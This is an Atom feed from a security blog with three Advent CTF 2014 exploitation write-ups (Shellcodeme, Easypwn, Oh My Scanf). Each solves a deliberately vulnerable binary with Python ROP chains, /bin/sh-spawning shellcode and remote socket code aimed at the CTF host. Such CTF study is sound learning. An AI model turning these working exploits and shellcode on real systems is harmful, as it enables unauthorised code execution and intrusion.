<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploitation | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/exploitation/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2014-12-30T11:05:59+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Shellcodeme]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/"/>
    <updated>2014-12-24T11:37:46+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme</id>
    <content type="html"><![CDATA[<p>Why o why do we take part in these painful exercises? Again, <code>shellcodeme</code> seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!</p>

<!-- more -->


<p></p>

<p>We&rsquo;re given a binary and the C source code:</p>

<pre><code class="c">/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;

#define SHELLCODE_LEN 1024

int main(void) {
    char *buf;
    buf = mmap((void *)0x20000000, SHELLCODE_LEN, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    read(0, &amp;buf, SHELLCODE_LEN);
    mprotect((void *)0x20000000, SHELLCODE_LEN, PROT_READ); // no no no~
    (*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
}
</code></pre>

<p>The bug was kind of obvious:</p>

<pre><code class="c">read(0, &amp;buf, SHELLCODE_LEN); // read to the location of buf itself
</code></pre>

<p>The code will read in the shellcode at <code>&amp;buf</code>, not <code>buf</code>. This will allow us to overwrite that pointer and take control of execution at this line of code:</p>

<pre><code class="c">(*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
</code></pre>

<p>I chose to overwrite the <code>buf</code> pointer with <code>0x080484fc</code>, which is <code>leave; ret</code>. This will restore the stack and land us in my ROP chain. The basic idea is to re-use <code>mprotect</code> and <code>read</code> to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:</p>

<pre><code class="python">#!/usr/bin/python
import struct
import socket
import telnetlib
import time

def p(x):
        return struct.pack('&lt;L', x)

POP3RET = 0x804855d
MPROTECT = 0x8048330
READ = 0x8048340

payload = ""
payload += p(0x080484fc)        # leave; ret (restore stack)
payload += "A"*12               # dummy 

payload += p(MPROTECT)          # mprotect shellcode area back to rwx
payload += p(POP3RET)           # fix stack
payload += p(0x20000000)        # addr of shellcode
payload += p(0x1000)            # size (page-aligned)
payload += p(0x7)               # PROT_READ|PROT_EXEC|PROT_WRITE

payload += p(READ)              # read in our shellcode
payload += p(POP3RET)           # fix stack
payload += p(0x0)               # stdin
payload += p(0x20000000)        # address
payload += p(1024)              # copied value

payload += p(0x20000000)        # return to shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.katsudon.org', 33201))

# send first stage
s.send(payload)

# for some reason, this delay was necessary
time.sleep(0.05)

# send shellcode, spawns /bin/sh
s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")

t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>I thought I was home-free! Let&rsquo;s cat that flag and be done with it! But what&rsquo;s this? (Yes, I&rsquo;ve started using kali! =))</p>

<pre><code class="bash">root@kali:~# python exploit.py
id
uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
ls -alh
total 36K
dr-xr-xr-x 2 root shellcodeme2 4.0K Dec 22 22:09 .
drwxr-xr-x 3 root root         4.0K Dec 22 22:09 ..
-rw-r--r-- 1 root shellcodeme2  220 Sep 26 04:49 .bash_logout
-rw-r--r-- 1 root shellcodeme2 3.4K Sep 26 04:49 .bashrc
-rw-r--r-- 1 root shellcodeme2  675 Sep 26 04:49 .profile
-r--r----- 1 root shellcodeme2   34 Dec 22 22:09 flag
-r-xr-sr-x 1 root shellcodeme2 8.5K Dec 22 22:09 shellcodeme2
cat flag 2&gt;&amp;1
cat: flag: Permission denied
</code></pre>

<p>Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code&hellip; I transferred the binary over to my box and started poking it.</p>

<p>The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:</p>

<pre><code class="bash">   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
   0x0000000000400609 &lt;+76&gt;:    mov    edx,0x1
   0x000000000040060e &lt;+81&gt;:    mov    esi,0x400
   0x0000000000400613 &lt;+86&gt;:    mov    edi,0x20000000
   0x0000000000400618 &lt;+91&gt;:    call   0x4004c0 &lt;mprotect@plt&gt;
</code></pre>

<p>I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> and analyzed it to find the gadgets I&rsquo;d need. I found <code>esi/rsi</code> and <code>edi/rdi</code> quickly, but <code>edx/rdx</code> was nowhere to be found. Finally, I located these two gadgets:</p>

<pre><code>0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
</code></pre>

<p>Prepare for some mind-bending ROP chains&hellip;</p>

<pre><code class="python">#!/usr/bin/python

import struct
def p(x):
    return struct.pack("L", x)

payload = ""

'''
   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
'''

# first, fix up stack   
payload += p(0x00400690)    # pop pop ret
payload += p(0x0)
payload += p(0x0)

#### MPROTECT
# gadgets to set edi, esi and edx and call mprotect
payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p(0x6)           # rbx   &lt;&lt; needs to be ebp-1 for code path!
payload += p(0x7)           # rbp -&gt; edx = mprotect.mask
payload += p(0x00601038-6*8)    # r12 -&gt; mprotect@got.plt
payload += p(0x0)           # r13
payload += p(0x400)         # r14 -&gt; rsi -&gt; esi = mprotect.len
payload += p(0x20000000)    # r15 -&gt; rdi -&gt; edi = mprotect.addr

payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
payload += "B"*(200-144)    # spacer

#### READ
# gadgets to set edi, esi and edx and call read
'''
   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
'''
# 0x601020 &lt;read@got.plt&gt;
payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p(0x400-1)       # rbx   &lt;&lt; needs to be ebp-1 for code path!
payload += p(0x400)         # rbp -&gt; edx = 0x400
payload += p(0x601020-0x3ff*8)  # r12 -&gt; read@got.plt
payload += p(0x0)           # r13 
payload += p(0x20000000)    # r14 -&gt; rsi -&gt; esi = read.addr
payload += p(0x0)           # r15 -&gt; rdi -&gt; edi = 0?
                            # lucky for me, rax = 0
payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
payload += "B"*(200-144)    # spacer

# return to shellcode!
payload += p(0x20000000)

print payload
</code></pre>

<p>One of the tricky things with the mprotect and read ROP chains is the following. The code at <code>0x400671</code>, which I use to set <code>edx</code>, looks like this:</p>

<pre><code>   0x400671 &lt;__libc_csu_init+65&gt;:   mov    edx,ebp
   0x400673 &lt;__libc_csu_init+67&gt;:   mov    rsi,r14
   0x400676 &lt;__libc_csu_init+70&gt;:   mov    edi,r15d
   0x400679 &lt;__libc_csu_init+73&gt;:   call   QWORD PTR [r12+rbx*8]
   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp  
   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
   0x400686 &lt;__libc_csu_init+86&gt;:   add    rsp,0x8
   0x40068a &lt;__libc_csu_init+90&gt;:   pop    rbx
   0x40068b &lt;__libc_csu_init+91&gt;:   pop    rbp
   0x40068c &lt;__libc_csu_init+92&gt;:   pop    r12
   0x40068e &lt;__libc_csu_init+94&gt;:   pop    r13
   0x400690 &lt;__libc_csu_init+96&gt;:   pop    r14
   0x400692 &lt;__libc_csu_init+98&gt;:   pop    r15
   0x400694 &lt;__libc_csu_init+100&gt;:  ret    
</code></pre>

<p>First <code>ebp</code> is copied to <code>edx</code>. Then <code>rsi</code> and <code>edi</code> are set. Then we call the QWORD pointer at a memory address referenced by <code>esi</code> and <code>ebx</code>. I chose to <code>esi</code> and <code>ebx</code> such that they point to the got pointer of mprotect.</p>

<p>The problem arises after returning from the mprotect call:</p>

<pre><code class="bash">   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp
   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
</code></pre>

<p>So I needed to make sure that <code>rbx</code> and <code>rbp</code> were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting <code>rbx</code> to <code>rbp-1</code>. Only thing left was to adjust <code>esi</code> and away we go! With the problem of setting <code>edx</code> out of the way, I could call mprotect to set <code>0x20000000</code> to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary.</p>

<p>I sprinkled in some <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.php">shellcode magic</a> and was able to exploit the binary locally!</p>

<p>Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:</p>

<pre><code class="python">shellcode = payload.encode('hex')

output = ""

for i in range(len(shellcode)/2):
    output += "\\x" +shellcode[i*2:i*2+2]

print output
</code></pre>

<p>I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn&rsquo;t work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read <code>flag</code> instead of <code>/etc/passwd</code>. For this, I had to adjust the offset:</p>

<pre><code>xor byte [rdi + 11], 0x41
--&gt;
xor byte [rdi + 4], 0x41
</code></pre>

<p>And <strong>finally</strong>, starting from the first binary:</p>

<pre><code class="bash">root@kali:~# python exploit.py
id
uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
(perl -e 'print "\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00"'; perl -e 'print "\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41"') | ./shellcodeme2
ADCTF_I_l0v3_tH15_4W350M3_m15T4K
</code></pre>

<p>This one was tough, but a fun one nonetheless! ROP all the things! =)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Easypwn]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn/"/>
    <updated>2014-12-21T10:24:42+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn</id>
    <content type="html"><![CDATA[<p>Another pwnable, named &ldquo;easypwn&rdquo;, no less! Should be a walk in the park, right?</p>

<!-- more -->


<p>Of course, it turns out it wasn&rsquo;t! We&rsquo;re given only the executable. The challenge description informs us: no libs, ASLR enabled. Flag is in <code>/home/easypwn/flag</code>. Great! Disassembling the binary leads to the following code:</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ objdump -d easypwn -M intel

easypwn:     file format elf32-i386


Disassembly of section .text:

08048080 &lt;syscall&gt;:
 8048080:   8b 54 24 0c             mov    edx,DWORD PTR [esp+0xc]
 8048084:   8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]
 8048088:   8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4]
 804808c:   cd 80                   int    0x80
 804808e:   c3                      ret    
 804808f:   90                      nop

08048090 &lt;pwn_me&gt;:
 8048090:   83 ec 10                sub    esp,0x10
 8048093:   b9 ed 80 04 08          mov    ecx,0x80480ed
 8048098:   b8 04 00 00 00          mov    eax,0x4          # write
 804809d:   6a 08                   push   0x8
 804809f:   51                      push   ecx
 80480a0:   6a 01                   push   0x1              # stdout
 80480a2:   ff d6                   call   esi
 80480a4:   83 c4 0c                add    esp,0xc
 80480a7:   89 e1                   mov    ecx,esp
 80480a9:   b8 03 00 00 00          mov    eax,0x3          # read
 80480ae:   68 80 00 00 00          push   0x80             # 128 bytes
 80480b3:   51                      push   ecx
 80480b4:   6a 00                   push   0x0              # stdin
 80480b6:   ff d6                   call   esi
 80480b8:   83 c4 0c                add    esp,0xc
 80480bb:   83 c4 10                add    esp,0x10
 80480be:   c3                      ret    
 80480bf:   90                      nop

080480c0 &lt;_start&gt;:
 80480c0:   56                      push   esi
 80480c1:   be 80 80 04 08          mov    esi,0x8048080
 80480c6:   e8 c5 ff ff ff          call   8048090 &lt;pwn_me&gt;
 80480cb:   b9 f6 80 04 08          mov    ecx,0x80480f6
 80480d0:   b8 04 00 00 00          mov    eax,0x4          # write
 80480d5:   6a 13                   push   0x13             # 0x13 bytes
 80480d7:   51                      push   ecx
 80480d8:   6a 01                   push   0x1              # stdout
 80480da:   ff d6                   call   esi
 80480dc:   83 c4 0c                add    esp,0xc
 80480df:   b8 01 00 00 00          mov    eax,0x1          # exit
 80480e4:   6a 00                   push   0x0
 80480e6:   ff d6                   call   esi
 80480e8:   83 c4 04                add    esp,0x4
 80480eb:   5e                      pop    esi
 80480ec:   c3                      ret    
</code></pre>

<p>That&rsquo;s not a whole lot to work with. Running it gives a clue on what to do:</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ ulimit -c unlimited
bas@tritonal:~/adventctf$ ./easypwn
pwn me: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
Segmentation fault (core dumped)
bas@tritonal:~/adventctf$ gdb ./easypwn core
...snip...
Core was generated by './easypwn'.
Program terminated with signal 11, Segmentation fault.
#0  0x45454545 in ?? ()
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre>

<p>OK, so it&rsquo;s a buffer overflow, yet stack is not executable. The program uses no libraries but syscalls to do its work. We must be able to ROP our way to the flag! We have the syscall gadget lined up for us at <code>0x08048080</code>. Looks easy, right? Wrong!</p>

<p>There is one <strong>big</strong> problem:</p>

<pre><code class="bash">08048080 &lt;syscall&gt;:
 8048080:   8b 54 24 0c             mov    edx,DWORD PTR [esp+0xc]
 8048084:   8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]
 8048088:   8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4]
 804808c:   cd 80                   int    0x80
 804808e:   c3                      ret    
 804808f:   90                      nop
</code></pre>

<p>We have <em>no way</em> to set <code>eax</code>! The <code>eax</code> register contains the syscall number and is kind of crucial to what we want. I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> but I found no straightforward way to set <code>eax</code>. I&rsquo;d prefer a <code>mov eax</code> or <code>pop eax</code>, or even <code>sub eax</code> or <code>xor eax</code>. Anything, really! I dumped the ROP gadgets with <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">my own tool</a> and found this little gadget:</p>

<pre><code>RET: 0x80480e9: les eax, [esi+ebx*2]; ret;
</code></pre>

<p>Now this is a strange way to set <code>eax</code>. The <code>les</code> operand does the following: it loads the 48-bit value at the location of <code>esi+ebx*2</code> and sets <code>eax</code> to the first 32 bits and the <code>es</code> register to the last 16 bits. <em>However</em>, <code>es</code> does not tolerate just any old value. If the wrong value is passed, the program SEGFAULTS. To keep things simple, I looked for values in the binary like this: <code>0x0000000i, 0x0000</code>. This would load 0xi in <code>eax</code> and 0x0 in <code>es</code>.</p>

<p>It seemed nearly impossible to build a ROP chain that would open, read and write the data from the flag file. For instance, where would I write the filename? On the stack? ASLR is enabled so I&rsquo;d have no idea of knowing where the stack is. Instead, I went with a different strategy.</p>

<p>I am going to use the syscall <code>mprotect</code> to make the code section from 0x8048000 to 0x8049000 writeable. When this succeeds, I can use syscall <code>read</code> to read in any shellcode from stdin to the code section. Finally, I simply return to that region.</p>

<p>A problem here is that I can&rsquo;t set <code>eax</code> to 125 (==mprotect) with my little gadget. Instead, I re-use the return value of the last syscall before the buffer overflow: <code>read</code>! The return value of that syscall will be the number of bytes read&hellip; If we pass in 125 bytes as payload, then we get exactly the syscall number of mprotect in <code>eax</code>!</p>

<p>Here&rsquo;s what I came up with, bit by bit. I started the binary via socat, to emulate the target system:</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ socat TCP-LISTEN:28099,fork EXEC:./easypwn
</code></pre>

<p>And this is the ROP chain I built:</p>

<pre><code class="python">#!/usr/bin/python

import struct
import socket
import telnetlib

SYSCALL = 0x8048080
POPRET = 0x80480eb  # pop esi; ret
ADDESP = 0x80480bb  # add esp, 0x10; ret
LESEAX = 0x80480e9  # les eax,FWORD PTR [esi+ebx*2]

def p(x):
  return struct.pack("&lt;L", x)

payload = ""

payload += "A"*16       # smash stack!

payload += p(SYSCALL)   # I rely on the return value of the read syscall
payload += p(ADDESP)    # fix stack with add esp, 10; ret
payload += p(0x8048000) # address to modify
payload += p(0x1000)    # length (page-aligned!)
payload += p(0x7)       # PROT_READ|PROT_WRITE|PROT_EXEC
payload += "AAAA"       # dummy value

# reset ebx so we can set eax using the next gadget
payload += p(SYSCALL)
payload += p(ADDESP)
payload += p(0)         # set ebx = 0
payload += p(0x1000)    # don't care
payload += p(0x7)       # don't care
payload += "AAAA"       # dummy

# set eax = 3
# 0x804834a:    0x00000003  0x00000000
payload += p(POPRET)    # pop esi; ret
payload += p(0x804834a) # set esi = 0x804834a
payload += p(LESEAX)    # eax -&gt; 0x3 == syscall_read

payload += p(SYSCALL)
payload += p(ADDESP)    # fix stack
payload += p(0)         # stdin
payload += p(0x8048000) # address of buffer
payload += p(0x200)     # number of bytes to read
payload += "BBBB"       # dummy value

payload += p(0x8048000) # return to shellcode!

# payload length must be 125, because after read, the next
# syscall is mprotect; eax = 125
payload += "A"*(125-len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("localhost",28099))
s.connect(("pwnable.katsudon.org",28099))

s.send(payload)

# http://www.shell-storm.org/shellcode/files/shellcode-851.php
s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")

# the shell should have been spawned, so interact with it
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>This first bit of python sets up the exploit. I have a helper function called <code>p(x)</code> that can dump addresses in the correct endianness into the payload. First, the payload consists of 16 bytes to smash the stack. Then, the ROP chain starts. Finally, I made sure that the first payload is 125 bytes, so that <code>eax</code> will contain the correct syscall number for mprotect. This first important part of the ROP chain looks like this:</p>

<pre><code class="python">payload += p(SYSCALL)   # I rely on the return value of the read syscall
payload += p(ADDESP)    # fix stack with add esp, 10; ret
payload += p(0x8048000) # address to modify
payload += p(0x1000)    # length (page-aligned!)
payload += p(0x7)       # PROT_READ|PROT_WRITE|PROT_EXEC
payload += "AAAA"       # dummy value
</code></pre>

<p>This will call <code>syscall(0x8048000, 0x1000, 0x7)</code> with <code>eax</code> set to 125. This makes the memory area at 0x8048000 writeable! Next, I need to read in the shellcode, but for that <code>eax</code> must be 3. I first reset <code>ebx</code>:</p>

<pre><code class="python"># reset ebx so we can set eax using the next gadget
payload += p(SYSCALL)
payload += p(ADDESP)
payload += p(0)         # set ebx = 0
payload += p(0x1000)    # don't care
payload += p(0x7)       # don't care
payload += "AAAA"       # dummy
</code></pre>

<p>Whatever this syscall is (I don&rsquo;t know the value of <code>eax</code> after the mprotect call, nor do I care), it fails but the side-effect is that <code>ebx</code> is now 0. That sets us up for moving the correct number in <code>eax</code>:</p>

<pre><code class="python"># set eax = 3
'''
0x804834a:  0x00000003  0x00000000
'''
payload += p(POPRET)    # pop esi; ret
payload += p(0x804834a) # set esi = 0x804834a
payload += p(LESEAX)    # eax -&gt; 0x3 == syscall_read
</code></pre>

<p>First, I use a <code>pop esi; ret</code> gadget to set the value of <code>esi</code> to a 48 bit value that contains: 0x3, 0x0. Then I return to the little gadget to set <code>eax</code> (and <code>es</code>) using those values. This results in <code>eax</code> being the correct number for the next syscall, read:</p>

<pre><code class="python">payload += p(SYSCALL)
payload += p(ADDESP)    # fix stack
payload += p(0)         # stdin
payload += p(0x8048000) # address of buffer
payload += p(0x200)     # number of bytes to read
payload += "BBBB"       # dummy value

payload += p(0x8048000)
</code></pre>

<p>This reads in <code>0x200</code> bytes from stdin to the start of the executable section of the binary. Finally, the ROP chain returns to the start of that buffer, which hopefully contains our shellcode! Finally, make sure that the payload is indeed 125 bytes long, else this entire house of cards falls down:</p>

<pre><code class="python"># payload length must be 125, because after read, the next
# syscall is mprotect; eax = 125
payload += "A"*(125-len(payload))
</code></pre>

<p>Because I ran the executable locally via socat, I need to connect to the proper socket and send the payload. The same goes for the remote connection.</p>

<pre><code class="python">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("localhost",28099))
s.connect(("pwnable.katsudon.org",28099))

s.send(payload)
</code></pre>

<p>After finishing the ROP chain, the binary should now be awaiting further shellcode on stdin, so I&rsquo;d better send that over quickly!</p>

<pre><code class="python"># http://www.shell-storm.org/shellcode/files/shellcode-851.php
s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")

# the shell should have been spawned, so interact with it
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>The shellcode is sent over; the ROP chain will read it at <code>0x8048000</code>, return to it and execute <code>/bin/sh</code>. Then I pass the socket to a telnet client to interact with the spawned shell. This allowed me to read the flag!</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ python exploit_easy.py 
pwn me:
id
uid=1000(easypwn) gid=1000(easypwn) groups=1000(easypwn)
cat /home/easypwn/flag
ADCTF_175_345y_7o_cON7ROL_5Y5c4LL
</code></pre>

<p>The flag was <code>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Oh My Scanf]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf/"/>
    <updated>2014-12-17T22:22:34+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf</id>
    <content type="html"><![CDATA[<p>Another month, another CTF! This Advent CTF runs almost the entire month of December. This challenge seemed easy at first, but turned out to be a bit more tricky!</p>

<!-- more -->


<p>We&rsquo;re given a vulnerable binary plus the C source:</p>

<pre><code class="c">/* gcc -m32 -fno-stack-protector -zexecstack -o oh_my_scanf oh_my_scanf.c */
#include &lt;stdio.h&gt;

int main(void) {
    char name[16];

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("name: ");
    scanf("%s", name);
    printf("hi, %s\n", name);

    return 0;
}
</code></pre>

<p>This looks pretty straight-forward, right? <code>scanf</code>, an executable stack and a small buffer, oh my! A standard buffer overflow:</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ ulimit -c unlimited
bas@tritonal:~/adventctf$ ./oh_my_scanf 
name: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
hi, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
Segmentation fault (core dumped)
</code></pre>

<p>I checked <code>gdb</code> and <code>eip</code> was overwritten with <code>HHHH</code>, so we need 28 bytes to overflow the buffer. Next, because the stack is executable, we should be able to jump to it&hellip; but how? ALSR is enabled so we don&rsquo;t know the location of the stack. None of the registers contain a pointer to the shellcode, there aren&rsquo;t any <code>jmp esp</code> or <code>call esp</code> instructions. Bruteforcing it seemed tedious at best. We looked at writing a ROP chain, but there are very few useable gadgets.</p>

<p>Thinking long and hard together with Swappage and superkojiman, we came up with several strategies. One of the suggestions by Swappage revolved around abusing <code>scanf</code> to build shellcode somewhere. superkojiman noticed that the main code section is <code>rwx</code>!</p>

<pre><code>gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x08049000 r-xp  /home/bas/adventctf/oh_my_scanf
0x08049000 0x0804a000 r-xp  /home/bas/adventctf/oh_my_scanf
0x0804a000 0x0804b000 rwxp  /home/bas/adventctf/oh_my_scanf
0xf7e19000 0xf7e1a000 rwxp  mapped
...snip...
</code></pre>

<p>Yes, this has to be it! We can write to a section of memory that is executable <em>and</em> at a fixed location. After writing shellcode there, we simply jump to it to have our cake <em>and</em> eat it.</p>

<p>So I modified a ROP chain that I was fiddling with:</p>

<pre><code class="python">#!/usr/bin/python
import struct

def p(x):
  return struct.pack("&lt;L", x)

SCANF = 0x80483b0a
POPRET = 0x804835d
SCANF_STRING = 0x80495ce

payload = ""
payload += "A"*28

payload += p(SCANF)         # return-to-got, scanf
payload += p(POPRET)        # next return address
payload += p(SCANF_STRING)  # pointer to "%s", arg1 for scanf
payload += p(0x0804a040)    # pointer to readable/executable
                            # arbitrarily chosen section of code
                            # it doubles as return address
payload += "\n"             # close first scanf call

# this modified shellcode below will be read by the scanf call that results from our ROP chain.
# we need the extra "\na" to flush the buffer, i think. 
payload += "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x54\x59\x90\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xffflag\na"

print payload
</code></pre>

<p>I used a modified version of <a href="http://www.shell-storm.org/shellcode/files/shellcode-73.php">this shellcode</a>. The shellcode wasn&rsquo;t working locally, and I narrowed it down quickly to a bad byte, <code>0x0c</code>. This was part of the <code>lea ecx, [esp]</code> instruction. I exchanged this for:</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ rasm2 - 
push esp
54
pop ecx
59
nop
90
</code></pre>

<p>And off we went! I verified the exploit remotely by reading <code>/etc/passwd</code> and then I guessed the name of the flag file to be <code>flag</code>. Simple, really =)</p>

<pre><code class="bash">bas@tritonal:~/adventctf$ python exploit.py | nc pwnable.katsudon.org 32100
name: hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAA..].E.@..
ADCTF_Sc4NF_IS_PRe77Y_niCE
</code></pre>

